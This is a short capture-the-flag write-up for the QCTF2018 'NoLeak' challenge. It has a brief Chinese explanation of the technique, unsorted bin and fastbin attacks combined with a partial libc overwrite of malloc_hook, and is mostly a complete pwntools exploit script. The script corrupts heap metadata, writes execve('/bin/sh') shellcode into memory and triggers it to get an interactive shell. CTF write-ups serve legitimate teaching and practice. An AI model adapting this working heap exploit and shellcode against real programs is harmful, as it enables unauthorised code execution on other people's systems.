# QCTF2018 NoLeak
## Author: Wenhuo
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>这题主要利用unsorted bin attack和fastbin attack，难点主要就在没有信息可以输出，无法通过常规的方法leak出libc基址来利用，看了官方wp之后发现竟然还可以通过修改libc最低字节来定位到malloc_hook进行修改。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>其他难点也没啥了，那就直接放脚本了。</font></br>

Exploit
======

```python
from pwn import *

DEBUG=1

p=process('./NoLeak')

if DEBUG==1:
    context.log_level='debug'
    gdb.attach(p)

def rv(c):
    p.recvuntil(c)

def sd(c):
    p.send(c)

def sl(c):
    p.sendline(c)

def add(size,c):
    rv('choice :')
    sl('1')
    rv('Size: ')
    sl(str(size))
    rv('Data: ')
    sd(c)

def delete(index):
    rv('choice :')
    sl('2')
    rv('Index: ')
    sl(str(index))

def update(index,size,c):
    rv('choice :')
    sl('3')
    rv('Index: ')
    sl(str(index))
    rv('Size: ')
    sl(str(size))
    rv('Data: ')
    sd(c)

def malloc_pwn():
    rv('choice :')
    sl('1')
    rv('Size: ')
    sl('2')

#-------------------------
# no leak this time,so use
# unsorted bin attack to
# edit the libc's last bit to
# overwrite the malloc_hook with 
# shellcode's address

shellcode='\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

add(0x68,'\n') 
add(0x98,'\n') 
add(0x68,'\n') 
add(0x98,'\n') 

delete(0)
delete(1)

update(1,0x10,p64(0x601060)*2)
update(0,8,p64(0x601060+13))

add(0x98,'\n') 
add(0x68,'\n') 
add(0x68,'a'*3+p64(0x601070)+p64(0x601040))

update(8,1,'\x10')
update(9,len(shellcode),shellcode)
update(6,8,p64(0x601040))

malloc_pwn()
p.interactive()

```